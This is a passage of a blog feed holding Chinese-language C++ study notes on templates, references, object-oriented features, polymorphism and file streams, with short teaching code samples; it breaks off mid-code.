        <content type="html"><![CDATA[<h2 id="模板泛型编程">模板：泛型编程</h2><blockquote><p>函数模板 和 类模板 - 函数模板：返回值类型 和 参数类型<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token operator">></span>   <span class="token comment">// 或class</span></code></pre></p></blockquote><pre><code>&gt; 推导出的T 数据类型必须一致&gt; 模板必须要推出T的数据类型 &gt; 普通函数调用时可以发生自动类型转化（隐式类型转换）&gt; 函数模板调用时，如果是自动类型推导，不会发生隐式类型转换&gt; 如果利用指定显示类型转换，可以发生隐式类型转换&gt; 如果函数模板和普通函数都可以实现，优先调用普通函数&gt; 可以通过空模板参数列表来强制调用函数模板&gt; 函数模板也可以发生重载&gt; 如果函数模板可以产生更好的匹配,优先调用函数模板&gt; 对于自定义类型，函数模板有局限性，无法正常运行。&gt; 解决方法：提供模板的重载：为特定的类型提供具体化的模板</code></pre><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token operator">></span>开头<span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token operator">></span> <span class="token keyword">bool</span> <span class="token function">myCompare</span><span class="token punctuation">(</span>Person <span class="token operator">&amp;</span>p1<span class="token punctuation">,</span> Person <span class="token operator">&amp;</span>p2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> p1<span class="token punctuation">.</span>m_Name  <span class="token operator">==</span> p2<span class="token punctuation">.</span>m_Name <span class="token operator">&amp;&amp;</span> p1<span class="token punctuation">.</span>m_Age <span class="token operator">==</span> p2<span class="token punctuation">.</span>m_Age<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><ul><li><p>类模板 <pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 类模板</span><span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">nametype</span><span class="token punctuation">,</span><span class="token keyword">class</span> <span class="token class-name">ageType</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>nametype m_name<span class="token punctuation">;</span>ageType m_age<span class="token punctuation">;</span><span class="token function">Person</span><span class="token punctuation">(</span>nametype name<span class="token punctuation">,</span> ageType age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token operator">-></span>m_name <span class="token operator">=</span> name<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token operator">-></span>m_age <span class="token operator">=</span> age<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">showPerson</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"name: "</span> <span class="token operator">&lt;&lt;</span> <span class="token keyword">this</span><span class="token operator">-></span>m_name <span class="token operator">&lt;&lt;</span> <span class="token string">" age: "</span> <span class="token operator">&lt;&lt;</span> <span class="token keyword">this</span><span class="token operator">-></span>m_age <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">test02</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 指定nameType为string类型，ageType为int类型</span>Person<span class="token operator">&lt;</span>string<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span><span class="token function">P1</span><span class="token punctuation">(</span><span class="token string">"孙悟空"</span><span class="token punctuation">,</span> <span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>P1<span class="token punctuation">.</span><span class="token function">showPerson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></p><blockquote><p>类模板没有自动类型推导 <pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Person p("孙悟空", 1000); // 错误 类模板使用时候，不可以用自动类型推导</span>Person <span class="token operator">&lt;</span>string <span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">></span><span class="token function">p</span><span class="token punctuation">(</span><span class="token string">"孙悟空"</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//必须使用显示指定类型的方式，使用类模板</span></code></pre></p></blockquote><blockquote><p>类模板可以使用默认参数 <pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">NameType</span><span class="token punctuation">,</span> <span class="token keyword">class</span> <span class="token class-name">AgeType</span> <span class="token operator">=</span> <span class="token keyword">int</span><span class="token operator">></span> Person <span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">p</span><span class="token punctuation">(</span><span class="token string">"猪八戒"</span><span class="token punctuation">,</span> <span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//类模板中的模板参数列表 可以指定默认参数</span></code></pre></p></blockquote></li><li><p>创建时机 &gt; 普通类中的成员函数一开始就可以创建 &gt;类模板中的成员函数在调用时才创建<br /><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Person1</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span><span class="token keyword">void</span> <span class="token function">showPerson1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Person1 show"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Person2</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span><span class="token keyword">void</span> <span class="token function">showPerson2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Person2 show"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token class-name">MyClass</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>T obj<span class="token punctuation">;</span><span class="token comment">//类模板中的成员函数，并不是一开始就创建的，而是在模板调用时再生成</span><span class="token keyword">void</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> obj<span class="token punctuation">.</span><span class="token function">showPerson1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">fun2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> obj<span class="token punctuation">.</span><span class="token function">showPerson2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">test01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>MyClass<span class="token operator">&lt;</span>Person1<span class="token operator">></span> m<span class="token punctuation">;</span>m<span class="token punctuation">.</span><span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//m.fun2();//编译会出错，说明函数调用才会去创建成员函数</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">test01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></p></li><li><p>类模板对象做参数 &gt; 1. 指定传入的类型 ---直接显示对象的数据类型 &gt; 2. 参数模板化 ---将对象中的参数变为模板进行传递 &gt; 3. 整个类模板化 --- 将这个对象类型模板化进行传递</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 类模板</span><span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">NameType</span><span class="token punctuation">,</span> <span class="token keyword">class</span> <span class="token class-name">AgeType</span> <span class="token operator">=</span> <span class="token keyword">int</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//1、指定传入的类型  最常用</span><span class="token keyword">void</span> <span class="token function">printPerson1</span><span class="token punctuation">(</span>Person<span class="token operator">&lt;</span>string<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">&amp;</span>p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">T1</span><span class="token punctuation">,</span> <span class="token keyword">class</span> <span class="token class-name">T2</span><span class="token operator">></span><span class="token keyword">void</span> <span class="token function">printPerson2</span><span class="token punctuation">(</span>Person<span class="token operator">&lt;</span>T1<span class="token punctuation">,</span> T2<span class="token operator">></span><span class="token operator">&amp;</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">//3、整个类模板化</span><span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token keyword">void</span> <span class="token function">printPerson3</span><span class="token punctuation">(</span>T <span class="token operator">&amp;</span> p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  </code></pre><ul><li><p>类模板与继承 &gt;当子类继承的父类是一个类模板时，子类在声明的时候，要指定出父类中T的类型&gt; 如果不指定，编译器无法给子类分配内存 &gt;如果想灵活指定出父类中T的类型，子类也需变为类模板 <pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token class-name">Base</span><span class="token punctuation">&#123;</span>T m<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//class Son:public Base  //错误，c++编译需要给子类分配内存，必须知道父类中T的类型才可以向下继承</span><span class="token keyword">class</span> <span class="token class-name">Son</span> <span class="token operator">:</span><span class="token base-clause"><span class="token keyword">public</span> <span class="token class-name">Base</span><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token comment">//必须指定一个类型</span></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">test01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Son c<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//类模板继承类模板 ,可以用T2指定父类中的T类型</span><span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">T1</span><span class="token punctuation">,</span> <span class="token keyword">class</span> <span class="token class-name">T2</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token class-name">Son2</span> <span class="token operator">:</span><span class="token base-clause"><span class="token keyword">public</span> <span class="token class-name">Base</span><span class="token operator">&lt;</span><span class="token class-name">T2</span><span class="token operator">></span></span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span><span class="token function">Son2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token keyword">typeid</span><span class="token punctuation">(</span>T1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token keyword">typeid</span><span class="token punctuation">(</span>T2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Son2<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">></span> child1<span class="token punctuation">;</span></code></pre></p></li><li><p>类模板成员函数类外实现</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//构造函数 类外实现</span><span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">T1</span><span class="token punctuation">,</span> <span class="token keyword">class</span> <span class="token class-name">T2</span><span class="token operator">></span><span class="token class-name">Person</span><span class="token operator">&lt;</span>T1<span class="token punctuation">,</span> T2<span class="token operator">></span><span class="token double-colon punctuation">::</span><span class="token function">Person</span><span class="token punctuation">(</span>T1 name<span class="token punctuation">,</span> T2 age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//成员函数 类外实现</span><span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">T1</span><span class="token punctuation">,</span> <span class="token keyword">class</span> <span class="token class-name">T2</span><span class="token operator">></span><span class="token keyword">void</span> <span class="token class-name">Person</span><span class="token operator">&lt;</span>T1<span class="token punctuation">,</span> T2<span class="token operator">></span><span class="token double-colon punctuation">::</span><span class="token function">showPerson</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></code></pre><ul><li><p>类模板分文件编写:类模板中成员函数创建时机是在调用阶段，导致分文件编写时链接不到</p><blockquote><p>解决方式1：直接包含.cpp源文件解决方式2：将声明和实现写到同一个文件中，并更改后缀名为.hpp，hpp是约定的名称，并不是强制</p></blockquote></li><li><p>类模板与友元 &gt; 全局函数类内实现 - 直接在类内声明友元即可 &gt;全局函数类外实现 - 需要提前让编译器知道全局函数的存在</p></li><li><p>类模板案例</p><blockquote><p><code>delete[]p</code>:不仅释放p指向的内存，还逐一释放相应数组中每个元素的内存</p></blockquote></li><li><p>STL</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Programming Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 提高 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++核心</title>
      <link href="/2022/01/03/c-he-xin/"/>
      <url>/2022/01/03/c-he-xin/</url>
      
        <content type="html"><![CDATA[<h2 id="内存分区模型">内存分区模型</h2><blockquote><ul><li>代码区：二进制代码<ul><li>运行前，共享，只读</li></ul></li><li>全局区：全局变量、静态变量、全局常量<ul><li>运行前，操作系统释放</li></ul></li><li>栈区：参数值、局部变量，编译器自动分配释放<ul><li>不要返回局部变量的地址</li></ul></li><li>堆区：由程序员分配和释放，若程序员不释放，则由操作系统回收<ul><li>new开辟内存</li></ul></li></ul></blockquote><h2 id="引用">引用</h2><blockquote><ul><li>引用必须要初始化，一旦初始化，便不可更改（是谁的别名），可以赋值<ul><li>不要返回局部变量的引用</li><li>函数的调用可以成为左值</li><li>引用的本质：指针常量</li><li>自动解引用</li><li>常量引用:用在函数参数中，防止修改值<ul><li><code>const int&amp; ref = 10</code>的本质：创建int temp;</li></ul></li></ul></li></ul></blockquote><h2 id="函数提高">函数提高</h2><ul><li><p>默认参数 &gt; 从这个默认值往后都必须有默认值 &gt;或者声明有默认参数，或者实现有默认参数，不可同时有</p></li><li><p>函数占位参数:可以有默认参数，调用时参数必须填补<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">fuction</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"this is function "</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></p></li><li><p>函数重载: 函数名可以相同 &gt; 同一个作用域下 &gt; 函数名称相同&gt; 函数类型不同 或 参数个数不同 或 参数顺序不同 &gt;返回值不能作为重载的条件 &gt; int a =10;func(a)<code>(引用)</code>;func(10)<code>(const 引用)</code>，有无const也能发生重载 &gt; 函数重载遇上默认参数</p></li></ul><h2 id="面向对象">面向对象</h2><ul><li><p>访问权限 &gt; public 类内/外都可以访问 &gt; protected类内可以，类外不可以 &gt; private 类内可以，类外不可以 &gt;struct默认公有访问权限，class默认私有访问权限 &gt;成员属性设置为私有：1.可以自己控制读写权限。2.对于写可以控制数据的有效性。在方法上操作</p></li><li><p>.h 与.cpp文件的分工</p></li><li><p>构造函数与析构函数 &gt; 构造函数可以重载 &gt; 拷贝构造 &gt;析构函数没有参数 &gt;匿名对象<code>Person(10)</code>,当前执行结束后，会立即收回匿名对象，不要用拷贝构造函数初始化匿名对象（重定义）&gt; 拷贝构造函数：1.值传递给函数传参。2.以值方式返回局部对象 &gt;默认构造函数、默认析构函数、默认拷贝构造函数 &gt; - 构造函数调用规则：1.如果用户定义有参构造函数，则c++不提供默认构造函数，但提供默认拷贝构造函数。2.如果用户定义拷贝构造函数，C++不会提供默认构造函数。</p><blockquote><p>析构函数：将堆区开辟数据释放浅拷贝：堆区的内存重复释放。深拷贝解决</p></blockquote></li><li><p>初始化列表 &gt;<code>Person(int a,int b,int c):A(a),B(b),C(c)&#123;&#125;</code> &gt;先构造类对象，再构造自身，析构顺序与之相反</p></li><li><p>静态成员 &gt; 所有对象共享 &gt; 静态成员函数只能访问静态成员：1.可以类名访问</p></li><li><p>对象特性 &gt; 空对象占用一个字节 &gt; 只有非静态成员属于类的对象&gt; 返回对象 与 返回对象的引用 &gt; 空指针访问成员函数</p></li><li><p>常函数<code>void ShowPerson()const&#123;&#125;</code>不可以修改成员属性，除非变量前加<code>mutable</code></p></li><li><p>常对象只能调用常函数</p></li><li><p>thi指针的本质是指针常量，指向不可修改</p></li><li><p>友元：让一个函数或类访问另一个类中私有成员 &gt; -全局函数做友元:在Building类中<code>friend void GoodGuy(Building&amp; building)</code>&gt; - 类做友元： 在Building类中<code>friend class GoodGuy;</code> &gt;-成员函数做友元:在Building类中<code>friend void Goodguy::visit()</code></p></li><li><p>运算符重载 &gt; - 成员函数重载 或 全局函数重载 &gt;<code>Person operator+()</code> &gt;只能利用全局函数重载<code>&lt;&lt;</code>：<code>ostream&amp; operator &lt;&lt;(ostream&amp; out,Person&amp; p)</code>&gt;区分重置前置++与后置++：使用占位参数。后置递增返回值而不是引用：返回的临时变量不用引用返回&gt; - 函数调用运算符重载：仿函数 <pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Myadd</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>   <span class="token keyword">int</span> <span class="token keyword">operator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span> num1<span class="token punctuation">,</span><span class="token keyword">int</span> num2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    rerturn num1 <span class="token operator">+</span> num2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Myadd myadd<span class="token punctuation">;</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token function">myadd</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     cout <span class="token operator">&lt;&lt;</span> ret <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 匿名函数对象 ：类型（）</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">Myadd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></p></li></ul><h2 id="三大特性">三大特性</h2><ul><li><p>封装<br /></p></li><li><p>继承:<code>class 子类：继承方式 父类</code>,减少重复代码 &gt;<code>class java: public BasePage&#123;&#125;</code> <img src="/images/0_6.png"alt="继承方式" /> &gt; 父类中所有非静态成员属性都会被继承 &gt;开发人员命令提示符：查看对象模型：1.跳转文件路径 2.<code>cl /d1 reportSingleClassLayout类名 文件名</code> &gt;构造函数先父类后子类，析构顺序正好相反 &gt;继承同名：子类的直接访问，父类的加作用域。<code>son s;s.m_a,s.base::m_a,</code>同名函数同理 &gt;如果子类中出现和父类同名的成员函数，子类的同名成员函数会隐藏掉父类中所有同名成员函数&gt; source\0_6.png：animal-&gt;(sheep,tuo)-&gt;yangtuo,资源浪费 &gt; -<strong>虚基类</strong> &gt; - <strong>vbptr</strong><strong>vbtable</strong></p></li><li><p>多态 &gt;<strong>静态多态：</strong>函数重载，运算符重载，编译阶段确定函数地址&gt; <strong>动态多态：</strong>派生类和虚函数，运行阶段确定函数地址&gt; 1. 继承关系 2. 子类重写父类的虚函数 &gt;<strong>使用</strong>：父类的指针 或 引用 指向子类对象（ 函数参数） &gt;<strong>vfptr</strong>:当子类重写虚函数后，子类中的虚函数表（记录函数地址）中的内容会更新，会覆盖原先继承的来自父类的表</p><blockquote><p><strong>计算器类</strong>：对扩展进行开放，对修改进行关闭</p></blockquote></li><li><p>纯虚函数 &gt;基类中纯虚函数的实现毫无意义，<strong>抽象类：</strong>含有纯虚函数的类，无法实例化对象。<strong>纯虚函数：</strong><code>virtual 返回值 函数名（） = 0</code> &gt;<strong>虚析构函数</strong>：解决父类指针释放子类对象时不干净的问题 &gt;<strong>虚析构和纯虚析构</strong>：都需要在父类中有实现。含纯虚析构函数的类为抽象类，无法实例化</p></li></ul><h2 id="文件">文件</h2><ul><li><p><code>#include&lt;fstream&gt;</code>:通过文件可以将数持久化 &gt;- 文本文件与二进制文件 &gt; ofstream,ifstream,fstream</p></li><li><p>写文件 &gt; - 创建流对象<code>ofstream ofs;</code> &gt; -打开文件<code>ofs.open("文件路径"，打开方式)</code> &gt; -<code>ofs &lt;&lt; "写入的数据"</code> &gt; - 关闭文件<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/*ios::inios::outios::ate       初始位置：文件尾ios::app       追加方式写文件ios::trunc     如果文件存在先删除，在创建 ios::binary    二进制方式*/</span><span class="token comment">// 文件打开方式可以配合使用，利用|操作符</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;fstream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">test01</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>ofstream ofs<span class="token punctuation">;</span>ofs<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> ios<span class="token double-colon punctuation">::</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>ofs <span class="token operator">&lt;&lt;</span> <span class="token string">"姓名：张三"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>ofs <span class="token operator">&lt;&lt;</span> <span class="token string">"性别：男"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>ofs <span class="token operator">&lt;&lt;</span> <span class="token string">"年龄：18"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>ofs<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">test01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></p></li><li><p>读文件</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;fstream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">test02</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>ifstream ifs<span class="token punctuation">;</span>ifs<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> ios<span class="token double-colon punctuation">::</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ifs<span class="token punctuation">.</span><span class="token function">is_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"文件打开失败"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 第一种方式</span><span class="token comment">//char buf[] = &#123;0&#125;;</span><span class="token comment">//while (ifs >> buf) &#123;</span><span class="token comment">// cout &lt;&lt; buf &lt;&lt; endl;</span><span class="token comment">//&#125;</span>    <span class="token comment">// 第二种</span><span class="token comment">//char buf[1024] = &#123; 0 &#125;;</span><span class="token comment">//while (ifs.getline(buf,sizeof(buf)))</span><span class="token comment">//&#123;</span><span class="token comment">//cout &lt;&lt; buf &lt;&lt; endl;</span><span class="token comment">//&#125;</span><span class="token comment">//ifs.close();</span><span class="token keyword">char</span> c <span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">=</span> ifs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> c<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ifs<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">test02</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ul><li>二进制写</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;fstream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span><span class="token keyword">char</span> m_name<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> m_age<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 二进制文件 写文件</span><span class="token keyword">void</span> <span class="token function">test03</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 1. 包含头文件</span><span class="token comment">// 2. 创建输出流对象</span>ofstream <span class="token function">ofs</span><span class="token punctuation">(</span><span class="token string">"person.txt"</span><span class="token punctuation">,</span> ios<span class="token double-colon punctuation">::</span>out <span class="token operator">|</span> ios<span class="token double-colon punctuation">::</span>binary<span class="token punctuation">)</span><span class="token punctuation">;</span><span 